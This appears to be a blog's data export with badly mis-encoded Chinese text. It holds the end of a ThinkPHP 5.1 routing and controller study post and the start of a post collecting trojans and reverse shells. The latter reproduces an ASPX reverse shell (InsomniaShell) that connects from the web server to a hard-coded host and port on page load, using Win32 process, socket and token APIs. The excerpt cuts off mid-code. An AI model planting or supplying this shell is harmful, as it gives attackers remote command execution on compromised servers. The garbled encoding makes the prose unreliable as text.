$default);&#125; else &#123; return request()-&gt;$method($key, $default, $filter);&#125; å¦‚æœè®¾ç½®äº† $hasï¼ˆæŸ¥è¯¢é”®æ˜¯å¦å­˜åœ¨ï¼‰ï¼Œè°ƒç”¨ has æ–¹æ³•æ¥æ£€æŸ¥é”®æ˜¯å¦å­˜åœ¨ï¼Œæ–¹æ³•ååŠ¨æ€ä» $method å˜é‡è·å–ï¼ˆåˆ©ç”¨ PHP çš„å˜é‡å‡½æ•°ç‰¹æ€§ï¼‰ã€‚ å¦‚æœæ²¡æœ‰è®¾ç½® $hasï¼Œç›´æ¥é€šè¿‡åŠ¨æ€æ–¹æ³•åè·å–é”®çš„å€¼ï¼Œä¼ é€’ $key, $default, å’Œ $filter ä½œä¸ºå‚æ•°ã€‚ 0x04 è·¯ç”±æœºåˆ¶ thinkphp é‡‡ç”¨çš„æ˜¯å¤šè·¯ç”±æ–¹å¼ å®šä¹‰æ–¹å¼ å®šä¹‰æ ¼å¼ æ–¹å¼1ï¼šè·¯ç”±åˆ°æ¨¡å—&#x2F;æ§åˆ¶å™¨ â€˜[æ¨¡å—&#x2F;æ§åˆ¶å™¨&#x2F;æ“ä½œ]?é¢å¤–å‚æ•°1&#x3D;å€¼1&amp;é¢å¤–å‚æ•°2&#x3D;å€¼2â€¦â€™ æ–¹å¼2ï¼šè·¯ç”±åˆ°é‡å®šå‘åœ°å€ â€˜å¤–éƒ¨åœ°å€â€™ï¼ˆé»˜è®¤301é‡å®šå‘ï¼‰ æˆ–è€… [â€˜å¤–éƒ¨åœ°å€â€™,â€˜é‡å®šå‘ä»£ç â€™] æ–¹å¼3ï¼šè·¯ç”±åˆ°æ§åˆ¶å™¨çš„æ–¹æ³• â€˜@[æ¨¡å—&#x2F;æ§åˆ¶å™¨&#x2F;]æ“ä½œâ€™ æ–¹å¼4ï¼šè·¯ç”±åˆ°ç±»çš„æ–¹æ³• â€˜\\å®Œæ•´çš„å‘½åç©ºé—´ç±»::é™æ€æ–¹æ³•â€™ æˆ–è€… â€˜\\å®Œæ•´çš„å‘½åç©ºé—´ç±»@åŠ¨æ€æ–¹æ³•â€™ æ–¹å¼5ï¼šè·¯ç”±åˆ°é—­åŒ…å‡½æ•° é—­åŒ…å‡½æ•°å®šä¹‰ï¼ˆæ”¯æŒå‚æ•°ä¼ å…¥ï¼‰ è·¯ç”±åˆ°æ¨¡å—&#x2F;æ§åˆ¶å™¨è¿™æ˜¯æœ€å¸¸ç”¨çš„ä¸€ç§è·¯ç”±æ–¹å¼ï¼ŒæŠŠæ»¡è¶³æ¡ä»¶çš„è·¯ç”±è§„åˆ™è·¯ç”±åˆ°ç›¸å…³çš„æ¨¡å—ã€æ§åˆ¶å™¨å’Œæ“ä½œï¼Œç„¶åç”±Appç±»è°ƒåº¦æ‰§è¡Œç›¸å…³çš„æ“ä½œã€‚ åœ¨é€šè¿‡route/route.php æ¥è‡ªå®šä¹‰è·¯ç”± è·¯ç”±åœ°å€ Â· ThinkPHP5.1å®Œå…¨å¼€å‘æ‰‹å†Œ Â· çœ‹äº‘ (kancloud.cn) thinkphpé‡‡ç”¨çš„æ—¶MVCçš„å¼€å‘æ¨¡å¼ï¼ŒCä»£è¡¨controllerï¼Œæ˜¯æ§åˆ¶å™¨ï¼Œç”¨äºè¿›è¡Œè·¯ç”±çš„è½¬å‘ã€‚indexæ§åˆ¶å™¨åœ¨index/controller/Index.php 1Route::get(&#x27;hello/:name&#x27;, &#x27;index/hello&#x27;); è¿™æ¡è·¯ç”±å®šä¹‰æŒ‡æ˜äº†å½“å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘èµ·ä¸€ä¸ªGETè¯·æ±‚ï¼Œä¸”URLåŒ¹é…hello/:nameæ¨¡å¼æ—¶ï¼Œè¯·æ±‚å°†è¢«è½¬å‘åˆ°indexæ¨¡å—çš„indexæ§åˆ¶å™¨çš„helloæ–¹æ³•å¤„ç†ã€‚:nameæ˜¯ä¸€ä¸ªåŠ¨æ€å‚æ•°ï¼Œå®ƒä¼šæ•è·URLä¸­ç›¸åº”ä½ç½®çš„å€¼å¹¶ä¼ é€’ç»™æ§åˆ¶å™¨æ–¹æ³•ã€‚ URL çš„è®¿é—®è®¾è®¡ï¼šURLè®¿é—® Â· ThinkPHP5.1å®Œå…¨å¼€å‘æ‰‹å†Œ Â· çœ‹äº‘ (kancloud.cn)ï¼Œå¯ä»¥å»è®¿é—®helloæ–¹æ³• å¦‚æœä¸æ”¯æŒPATHINFOçš„æœåŠ¡å™¨å¯ä»¥ä½¿ç”¨å…¼å®¹æ¨¡å¼è®¿é—®å¦‚ä¸‹ï¼š 1http://serverName/index.phpï¼ˆæˆ–è€…å…¶å®ƒåº”ç”¨å…¥å£æ–‡ä»¶ï¼‰?s=/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼...\\] æ‰€ä»¥è®¿é—®helloæ–¹æ³•çš„æ—¶å€™ï¼Œæ„é€ è·¯ç”±http://thinkphp5:8090/public/index.php?s=index/index/hello/name å¯ä»¥ä¼ å‚è¿›å» è¿˜å¯ä»¥æ”¯æŒè·¯ç”±åˆ°åŠ¨æ€çš„æ¨¡å—ã€æ§åˆ¶å™¨æˆ–è€…æ“ä½œï¼Œä¾‹å¦‚ï¼š 1234// actionå˜é‡çš„å€¼ä½œä¸ºæ“ä½œæ–¹æ³•ä¼ å…¥Route::get(&#x27;:action/blog/:id&#x27;, &#x27;index/blog/:action&#x27;);// å˜é‡ä¼ å…¥indexæ¨¡å—çš„æ§åˆ¶å™¨å’Œæ“ä½œæ–¹æ³•Route::get(&#x27;:c/:a&#x27;, &#x27;index/:c/:a&#x27;); è·¯ç”±åˆ°é‡å®šå‘åœ°å€æ—§çš„é¡µé¢URLï¼Œå¦‚ /old-pageï¼Œæƒ³è¦å°†æ‰€æœ‰è®¿é—®è¿™ä¸ªæ—§é¡µé¢çš„è¯·æ±‚é‡å®šå‘åˆ°æ–°é¡µé¢ /new-pageï¼Œä¸‹é¢æ˜¯å¦‚ä½•è®¾ç½®è·¯ç”±è§„åˆ™çš„ä¾‹å­ï¼š 1234567use think\\Route;// ä½¿ç”¨redirectæ–¹æ³•è¿›è¡Œé‡å®šå‘Route::get(&#x27;old-page&#x27;, &#x27;redirect:/new-page&#x27;);// æˆ–è€…ä½¿ç”¨å®Œæ•´URLè¿›è¡Œé‡å®šå‘Route::get(&#x27;old-blog&#x27;, &#x27;redirect:http://example.com/new-blog&#x27;); è¿™äº›è·¯ç”±è§„åˆ™æ„å‘³ç€ï¼š è®¿é—® /old-page æ—¶ï¼Œç”¨æˆ·ä¼šè¢«è‡ªåŠ¨é‡å®šå‘åˆ° /new-pageã€‚ è®¿é—® /old-blog æ—¶ï¼Œç”¨æˆ·ä¼šè¢«è‡ªåŠ¨é‡å®šå‘åˆ° http://example.com/new-blogã€‚ åŠ¨æ€ä¼ é€’çš„è·¯ç”±å‚æ•° 12// åŠ¨æ€é‡å®šå‘Route::get(&#x27;user/:id&#x27;, &#x27;redirect:/new-user/:id&#x27;); åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä»»ä½•å½¢å¦‚ /user/123 çš„URLå°†ä¼šè¢«é‡å®šå‘åˆ° /new-user/123ï¼Œå…¶ä¸­ :id æ˜¯åŠ¨æ€ä¼ é€’çš„ã€‚ redirectæ–¹æ³• V5.1.3+ç‰ˆæœ¬å¼€å§‹ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨redirectæ–¹æ³•æ³¨å†Œä¸€ä¸ªé‡å®šå‘è·¯ç”± 1Route::redirect(&#x27;blog/:id&#x27;,&#x27;http://blog.thinkphp.cn/read/:id&#x27;,302); 0x05 æ§åˆ¶å™¨æ§åˆ¶å™¨å®šä¹‰ Â· ThinkPHP5.1å®Œå…¨å¼€å‘æ‰‹å†Œ Â· çœ‹äº‘ (kancloud.cn) ææ¸…æ¥šåŠŸèƒ½æ‰€åœ¨æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ä¸è®¿é—®URLä¹‹é—´çš„å…³ç³» æ§åˆ¶å™¨ç±» 123456789101112&lt;?phpnamespace app\\index\\controller;use think\\Controller;class Index extends Controller&#123; public function index() &#123; return &#x27;index&#x27;; &#125;&#125; æ§åˆ¶å™¨ç±»æ–‡ä»¶çš„å®é™…ä½ç½®æ˜¯ 1application\\index\\controller\\Index.php è®¿é—®URLåœ°å€æ˜¯ï¼ˆå‡è®¾æ²¡æœ‰å®šä¹‰è·¯ç”±çš„æƒ…å†µä¸‹ï¼‰ 1http://localhost/index.php/index åœ¨ThinkPHPä¸­ï¼ŒURLè®¿é—®åœ°å€é€šå¸¸é€šè¿‡è·¯ç”±æ¥å®šä¹‰ï¼Œè·¯ç”±å†³å®šäº†å“ªäº›URLå¯ä»¥è®¿é—®å“ªäº›æ§åˆ¶å™¨ä¸­çš„æ–¹æ³•ã€‚åŸºäºä¸Šé¢çš„Indexæ§åˆ¶å™¨ä¾‹å­ï¼Œå¦‚æœæƒ³é€šè¿‡URLè®¿é—®indexæ–¹æ³•ï¼Œéœ€è¦åœ¨è·¯ç”±é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ä¸€ä¸ªè·¯ç”±ï¼Œå¦‚ï¼š 1234// è·¯ç”±å®šä¹‰å¯èƒ½ä½äº route.php æ–‡ä»¶ä¸­use think\\Route;Route::get(&#x27;hello&#x27;, &#x27;index/index&#x27;); // å½“è®¿é—® /hello æ—¶ï¼Œè°ƒç”¨ index æ§åˆ¶å™¨çš„ index æ–¹æ³• è¿™æ„å‘³ç€å½“ç”¨æˆ·è®¿é—®http://yourdomain.com/helloæ—¶ï¼Œå°†ä¼šè§¦å‘Indexæ§åˆ¶å™¨çš„indexæ–¹æ³•ï¼Œå¹¶æ˜¾ç¤ºè¿”å›ç»“æœHello, ThinkPHP!ã€‚ 0x06 è·¯ç”±å’Œæ§åˆ¶å™¨ä¹‹é—´çš„å…³ç³»å¦‚æœæ²¡æœ‰æ˜ç¡®åœ°å®šä¹‰è·¯ç”±è§„åˆ™ï¼Œé‚£ä¹ˆURLçš„è®¿é—®å’Œè§£æä¼šä¾èµ–äºæ¡†æ¶çš„é»˜è®¤è·¯ç”±è§„åˆ™ã€‚ ThinkPHPé»˜è®¤çš„URLæ ¼å¼éµå¾ªä»¥ä¸‹ç»“æ„ï¼š 1http://[hostname]/[entry_script]/[module]/[controller]/[action] hostname - æœåŠ¡å™¨çš„åœ°å€ï¼ˆä¾‹å¦‚ localhostï¼‰ entry_script - å…¥å£æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ index.phpï¼‰ module - åº”ç”¨æ¨¡å—åï¼ˆé€šå¸¸æ˜¯ indexï¼‰ ç¡®å®šæ¨¡å—åçš„æ–¹æ³•ï¼š æŸ¥çœ‹é¡¹ç›®ç»“æ„ï¼šæ¨¡å—åé€šå¸¸æ˜¯applicationç›®å½•ä¸‹çš„å­ç›®å½•åã€‚ä½ å¯ä»¥æŸ¥çœ‹è¿™ä¸ªç›®å½•æ¥ç¡®å®šä½ çš„åº”ç”¨åŒ…å«å“ªäº›æ¨¡å—ã€‚ é…ç½®æ–‡ä»¶ï¼šThinkPHPçš„åº”ç”¨é…ç½®æ–‡ä»¶é€šå¸¸ä½äºapplication/config.phpï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­å¯ä»¥æŸ¥çœ‹é»˜è®¤æ¨¡å—çš„è®¾ç½®ï¼Œæˆ–è€…æ˜¯æ¨¡å—çš„ç›¸å…³é…ç½®ã€‚ä¾‹å¦‚ï¼š 12345678return [ // åº”ç”¨è®¾ç½® &#x27;app&#x27; =&gt; [ &#x27;default_module&#x27; =&gt; &#x27;index&#x27;, // é»˜è®¤æ¨¡å—å &#x27;deny_module_list&#x27; =&gt; [&#x27;common&#x27;], // ç¦æ­¢è®¿é—®çš„æ¨¡å— ], ...]; URLè®¿é—®ï¼šåœ¨æœªé…ç½®ç‰¹æ®Šè·¯ç”±çš„æƒ…å†µä¸‹ï¼ŒURLçš„ç»“æ„é€šå¸¸åæ˜ äº†æ¨¡å—çš„ä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œè®¿é—®http://yourdomain.com/index/controller/actionä¸­çš„indexå¯èƒ½å°±æ˜¯æ¨¡å—åã€‚ controller - æ§åˆ¶å™¨å action - æ§åˆ¶å™¨ä¸­çš„æ–¹æ³•å å¦‚æœä½ çš„æ§åˆ¶å™¨æ˜¯HelloWorldï¼Œå¹¶ä¸”å®šä¹‰å¦‚ä¸‹ï¼š 12345678910&lt;?phpnamespace app\\index\\controller;class HelloWorld &#123; public function index() &#123; return &#x27;helloï¼Œworldï¼&#x27;; &#125;&#125; æ§åˆ¶å™¨ç±»æ–‡ä»¶çš„å®é™…ä½ç½®æ˜¯ 1application\\index\\controller\\HelloWorld.php è®¿é—®url å¦‚æœä¸æŒ‡å®šæ–¹æ³•åï¼ŒThinkPHP é»˜è®¤ä¼šè°ƒç”¨æ§åˆ¶å™¨ä¸­çš„ index æ–¹æ³•ã€‚å› æ­¤ï¼Œå³ä½¿ URL ä¸­æ²¡æœ‰æ˜ç¡®æŒ‡å‡ºè¦è°ƒç”¨ index æ–¹æ³•ï¼Œç³»ç»Ÿä¹Ÿä¼šè‡ªåŠ¨å¯»æ‰¾å¹¶æ‰§è¡Œ HelloWorld æ§åˆ¶å™¨ä¸­çš„ index() æ–¹æ³•ã€‚ 12http://localhost/index.php/index/hello_world/index http://localhost/index.php/index/hello_world/ tipsï¼šæ§åˆ¶å™¨å‘½åå’ŒURLæ˜ å°„ åœ¨ThinkPHPä¸­ï¼Œæ§åˆ¶å™¨çš„å‘½åè§„èŒƒæ˜¯å¤§é©¼å³°ï¼ˆPascalCaseï¼‰ï¼Œå³æ¯ä¸ªå•è¯çš„é¦–å­—æ¯å¤§å†™ã€‚ä½†åœ¨URLä¸­ï¼Œæ§åˆ¶å™¨åé€šå¸¸ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºå°å†™ï¼Œå¹¶ä¸”é©¼å³°å‘½åä¸­çš„å¤§å†™å­—æ¯ä¼šé€šè¿‡ä¸‹åˆ’çº¿(_)è¿›è¡Œåˆ†éš”ã€‚æ‰€ä»¥HelloWorld æ§åˆ¶å™¨åœ¨URLä¸­è¢«è¡¨ç¤ºä¸º hello_world çš„åŸå› ã€‚ ä¹Ÿå¯ä»¥å…³é—­è‡ªåŠ¨è½¬åŒ–ï¼Œä»¥åŸæ¥çš„åå­—Helloworldæ¥è¿›è¡Œè®¿é—® 12// æ˜¯å¦è‡ªåŠ¨è½¬æ¢URLä¸­çš„æ§åˆ¶å™¨å’Œæ“ä½œå&#x27;url_convert&#x27; =&gt; false, 0x07 å‚è€ƒæ–‡ç« Thinkphp æºç é˜…è¯» - Y4erçš„åšå®¢ æ¨¡å—è®¾è®¡ Â· ThinkPHP5.1å®Œå…¨å¼€å‘æ‰‹å†Œ Â· çœ‹äº‘ (kancloud.cn) 0x08 ç¢ç¢å¿µå†™è¿™ç¯‡æ–‡ç« æ—¶çš„ç¢ç¢å¿µ ğŸ‘‡ æˆ‘å‘ç°æˆ‘çš„è„‘å­å°±åƒæˆ‘çš„ç¬”è®°ä¸€æ ·ã€‚è„‘å­é‡Œçš„å†…å®¹ç¨€ç¢æ—¶ï¼Œç¬”è®°ä¹Ÿæ˜¯ã€‚ å­¦ä¹ çŸ¥è¯†æ˜¯ä¸€ä¸ªé—­ç¯çš„è¿‡ç¨‹ã€‚æˆ‘åœ¨å­¦ä¹ thinkphpæ¡†æ¶çš„è¿‡ç¨‹æ˜¯ï¼šå…ˆæŠŠthinkphpçš„æ¡†æ¶æ–‡æ¡£è¿‡äº†ä¸€éï¼Œè„‘å­å¾ˆä¹±ï¼Œä½†æ˜¯èƒ½åƒµç¡¬çš„æ¢å‡ºæ¥ä¸€äº›æ¡†æ¶æµç¨‹å›¾ã€‚å¯æ˜¯ç”Ÿæ¶©ä¸ç†è§£ï¼Œè„‘å­é‡Œæ„å»ºä¸å‡ºæ¥ä¸€å‰¯å®Œæ•´çš„ç”»é¢ã€‚å­¦ç€å­¦ç€ï¼Œæœ‰ç‚¹æ²¡æ–¹å‘äº†ï¼Œæˆ‘åˆä»è·¯ç”±çœ‹èµ·ã€‚ä½†æ˜¯è·¯ç”±è¿›å»çš„æ—¶å€™ï¼Œèµ°controllerã€‚ç„¶åæˆ‘å°±å¿½ç„¶ï¼Œè„‘å­çµå…‰ä¸€é—ªï¼Œæ˜ç™½äº†æ¡†æ¶çš„å…¥å£åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆæ„æ€äº†ã€‚æˆ‘ä¹‹å‰æ²¡æ˜ç™½æ¡†æ¶å…¥å£åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆæ„æ€ï¼Œç°åœ¨å¿½ç„¶æ‡‚äº†ï¼Œç¨‹åºçš„å…¥å£ä¸æ˜¯routeè€Œæ˜¯æ¡†æ¶å…¥å£ã€‚å®ƒè§„å®šäº†è·¯ç”±æ˜¯æ€ä¹ˆèµ°çš„ã€‚ç„¶åæˆ‘å°±åˆå¿½ç„¶æ˜ç™½äº†ï¼Œthinkphpå¤šè·¯ç”±åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ã€‚ å­¦ä¹ çš„æ—¶å€™ï¼Œå¦‚æœç»™ä½ ä¸€ä¸ªâ€œæ„ä¹‰â€å’Œç›®çš„ï¼Œä½ å°±ä¼šè‡ªå·±æ¨ç€è‡ªå·±å‘å‰èµ°äº†ã€‚ä¸è¿‡è¿™ä¹Ÿå¯èƒ½æ˜¯æˆ‘å¿½ç„¶æ¢ç´¢æ˜ç™½äº†è‡ªå·±çš„å­¦ä¹ æ¨¡å¼ã€‚æˆ‘å­¦ä¹ çš„è¯ï¼Œéœ€è¦ä¸€ä¸ªâ€œæ„ä¹‰é©±åŠ¨â€ã€‚æœ‰äº†è¿™æ ·çš„é©±åŠ¨ï¼Œæˆ‘å°±æœ‰äº†è‡ªå·±çš„å­¦ä¹ æ¨¡å¼å’Œæ–¹å‘ã€‚ å­¦ä¹ ä»£ç å®¡è®¡çš„æ—¶å€™ï¼Œæˆ‘è§‰å¾—ç‰¹åˆ«æ²¡æœ‰æ–¹å‘ï¼Œç„¶åæˆ‘çœ‹è§pç¥è¯´ï¼Œè¦ä»æ¡†æ¶åº•å±‚çœ‹èµ·ã€‚æˆ‘å°±å»çœ‹æ–‡æ¡£ï¼Œä¸æ˜ç™½æ„ä¹‰ä½•åœ¨ï¼Œçœ‹çš„äº‘é‡Œé›¾é‡Œã€‚åæ¥æˆ‘å°±å»é—®chatæ£®æ£®ï¼Œä¸ºä»€ä¹ˆè¦å­¦æ¡†æ¶ï¼Œæˆ‘æƒ³è¦ä»£ç å®¡è®¡ï¼Œä½†æˆ‘ä¸æ˜ç™½æˆ‘è¯¥ä»å“ªä¸ªæ–¹å‘çœ‹èµ·ï¼Œåˆè¦å­¦åˆ°ä»€ä¹ˆç¨‹åº¦ã€‚åæ¥chatæ£®æ£®è·Ÿæˆ‘è¯´â€œç†Ÿæ‚‰ThinkPHPæˆ–ä»»ä½•å…¶ä»–ç›®æ ‡æ¡†æ¶çš„ç›®å½•ç»“æ„ã€æ ¸å¿ƒç»„ä»¶ä»¥åŠå…¶å·¥ä½œæ–¹å¼ã€‚è¿™åŒ…æ‹¬äº†è§£å…¶è·¯ç”±æœºåˆ¶ã€æ§åˆ¶å™¨ã€æ¨¡å‹ã€è§†å›¾ã€ä¸­é—´ä»¶å’ŒæœåŠ¡æä¾›è€…â€ã€‚äºæ˜¯è¿™ä¸ªæ—¶å€™æˆ‘çš„æ–¹å‘å°±æ˜¯çœ‹è·¯ç”±æœºåˆ¶æ˜¯æ€ä¹ˆè¿è¡Œçš„ã€‚çœ‹ç€çœ‹ç€ï¼Œæˆ‘è‡ªå·±å°±æ‰¾åˆ°äº†æ–¹å‘ï¼Œè‡ªå·±å€’æ¨åˆ°äº†â€œç¨‹åºå…¥å£â€å’Œthinkphpçš„å¤šè·¯ç”±æœºåˆ¶ã€‚ç„¶åæˆ‘å°±æƒ³åˆ°äº†y4erçš„æ–‡ç« ã€‚ä»–å°±æ˜¯ä»æ¡†æ¶å…¥å£start.php æ–‡ä»¶å¼€å§‹è®²çš„ã€‚ é‚£ä¸€åˆ»ï¼æˆ‘å®Œæˆäº†é—­ç¯ï¼Œè™½ç„¶æˆ‘è¿˜æ²¡å®Œå…¨å¼„æ‡‚ï¼Œä½†æ˜¯æˆ‘æœ‰äº†æ–¹å‘ï¼Œç»§ç»­çœ‹ä¸‹å»ï¼Œæˆ‘å°±ç†è§£äº†åˆ°åº•æ˜¯æ€ä¹ˆå›äº‹ã€‚å†æŠ½è±¡ä¸€ç‚¹å›é¡¾è¿™ä¸ªå­¦ä¹ çš„è¿‡ç¨‹ã€‚æˆ‘å‘ç°è¿™æ‰æ˜¯æˆ‘â€œç§äººå®šåˆ¶â€çš„ä¸€ç§å­¦ä¹ æ–¹å¼ã€‚æˆ‘åšäº‹æƒ…ä¸€ç›´éƒ½å–œæ¬¢å…ˆæŠŠæ¡†æ¶å®šå‡ºæ¥ï¼Œç„¶åå†æœ‰æ–¹å‘æ€§çš„å¡«å†…å®¹è¿›å»ã€‚","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://gryffinbit.top/tags/thinkphp/"}],"author":"Gryffinbit"},{"title":"æœ¨é©¬ã€åå¼¹shell åˆé›†","slug":"æœ¨é©¬ã€åå¼¹shell-åˆé›†","date":"2023-12-05T10:10:58.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/12/05/æœ¨é©¬ã€åå¼¹shell-åˆé›†/","permalink":"https://gryffinbit.top/2023/12/05/%E6%9C%A8%E9%A9%AC%E3%80%81%E5%8F%8D%E5%BC%B9shell-%E5%90%88%E9%9B%86/","excerpt":"","text":"åå¼¹ shellASPX123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Runtime.InteropServices&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Net&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Net.Sockets&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Security.Principal&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Data.SqlClient&quot; %&gt;&lt;script runat=&quot;server&quot;&gt;//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell///Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip protected void Page_Load(object sender, EventArgs e) &#123; String host = &quot;192.168.28.1&quot;; //CHANGE THIS int port = 1234; ////CHANGE THIS CallbackShell(host, port); &#125; [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO &#123; public int cb; public String lpReserved; public String lpDesktop; public String lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; &#125; [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION &#123; public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; &#125; [StructLayout(LayoutKind.Sequential)] public struct SECURITY_ATTRIBUTES &#123; public int Length; public IntPtr lpSecurityDescriptor; public bool bInheritHandle; &#125; [DllImport(&quot;kernel32.dll&quot;)] static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation); public static uint INFINITE = 0xFFFFFFFF; [DllImport(&quot;kernel32&quot;, SetLastError = true, ExactSpelling = true)] internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds); internal struct sockaddr_in &#123; public short sin_family; public short sin_port; public int sin_addr; public long sin_zero; &#125; [DllImport(&quot;kernel32.dll&quot;)] static extern IntPtr GetStdHandle(int nStdHandle); [DllImport(&quot;kernel32.dll&quot;)] static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle); public const int STD_INPUT_HANDLE = -10; public const int STD_OUTPUT_HANDLE = -11; public const int STD_ERROR_HANDLE = -12; [DllImport(&quot;kernel32&quot;)] static extern bool AllocConsole(); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags ); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern int inet_addr([In] string cp); [DllImport(&quot;ws2_32.dll&quot;)] private static extern string inet_ntoa(uint ip); [DllImport(&quot;ws2_32.dll&quot;)] private static extern uint htonl(uint ip); [DllImport(&quot;ws2_32.dll&quot;)] private static extern uint ntohl(uint ip); [DllImport(&quot;ws2_32.dll&quot;)] private static extern ushort htons(ushort ip); [DllImport(&quot;ws2_32.dll&quot;)] private static extern ushort ntohs(ushort ip); [DllImport(&quot;WS2_32.dll&quot;, CharSet=CharSet.Ansi, SetLastError=true)] internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern int send( [In] IntPtr socketHandle, [In] byte[] pinnedBuffer, [In] int len, [In] SocketFlags socketFlags ); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern int recv( [In] IntPtr socketHandle, [In] IntPtr pinnedBuffer, [In] int len, [In] SocketFlags socketFlags ); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern int closesocket( [In] IntPtr socketHandle ); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern IntPtr accept( [In] IntPtr socketHandle, [In, Out] ref sockaddr_in socketAddress, [In, Out] ref int socketAddressSize ); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern int listen( [In] IntPtr socketHandle, [In] int backlog ); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern int bind( [In] IntPtr socketHandle, [In] ref sockaddr_in socketAddress, [In] int socketAddressSize ); public enum TOKEN_INFORMATION_CLASS &#123; TokenUser = 1, TokenGroups, TokenPrivileges, TokenOwner, TokenPrimaryGroup, TokenDefaultDacl, TokenSource, TokenType, TokenImpersonationLevel, TokenStatistics, TokenRestrictedSids, TokenSessionId &#125; [DllImport(&quot;advapi32&quot;, CharSet = CharSet.Auto)] public static extern bool GetTokenInformation( IntPtr hToken, TOKEN_INFORMATION_CLASS tokenInfoClass, IntPtr TokenInformation, int tokeInfoLength, ref int reqLength); public enum TOKEN_TYPE &#123; TokenPrimary = 1, TokenImpersonation &#125; public enum SECURITY_IMPERSONATION_LEVEL &#123; SecurityAnonymous, SecurityIdentification, SecurityImpersonation, SecurityDelegation &#125; [DllImport(&quot;advapi32.dll&quot;, EntryPoint = &quot;CreateProcessAsUser&quot;, SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)] public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation); [DllImport(&quot;advapi32.dll&quot;, EntryPoint = &quot;DuplicateTokenEx&quot;)] public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType, ref IntPtr DuplicateTokenHandle); const int ERROR_NO_MORE_ITEMS = 259; [StructLayout(LayoutKind.Sequential)] struct TOKEN_USER &#123; public _SID_AND_ATTRIBUTES User; &#125; [StructLayout(LayoutKind.Sequential)] public struct _SID_AND_ATTRIBUTES &#123; public IntPtr Sid; public int Attributes; &#125; [DllImport(&quot;advapi32&quot;, CharSet = CharSet.Auto)] public extern static bool LookupAccountSid ( [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName, IntPtr 